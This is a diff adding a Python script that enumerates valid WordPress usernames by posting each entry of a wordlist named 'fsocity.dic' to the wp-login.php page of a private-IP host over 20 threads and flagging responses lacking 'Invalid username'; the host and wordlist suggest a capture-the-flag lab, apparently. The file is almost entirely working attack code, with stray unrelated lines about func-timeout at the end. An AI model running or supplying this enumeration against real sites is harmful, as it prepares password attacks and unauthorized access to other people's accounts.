@@ -1,3 +1,41 @@
+import requests
+import re 
+import hashlib
+import base64
+import concurrent.futures
+import time
+
+
+URL = "10.80.154.88"
+
+url = f'http://{URL}/wp-login.php'
+
+
+usernames = [username.replace('\n', '')for username in open('fsocity.dic', 'r').readlines()]
+len_usernames = len(usernames)
+
+def check_username(username):
+    data_to_be_sent = {
+        "log": f"{username}",
+        "pwd": "ddddddd",
+        "wp-submit": "Log+In"
+    }
+    response = requests.post(url, data_to_be_sent)
+    text = response.text
+    if "Invalid username" not in response.text:
+        print("------------------")
+        print(f"Found valid username : {username}")
+        print("------------------")   
+
+start = time.time()
+
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+    executor.map(check_username, usernames)
+print(f"Total time: {time.time() - start:.2f}s")
+
+
+///////////////
 pip install func-timeout
 
 from func_timeout import func_timeout, FunctionTimedOut
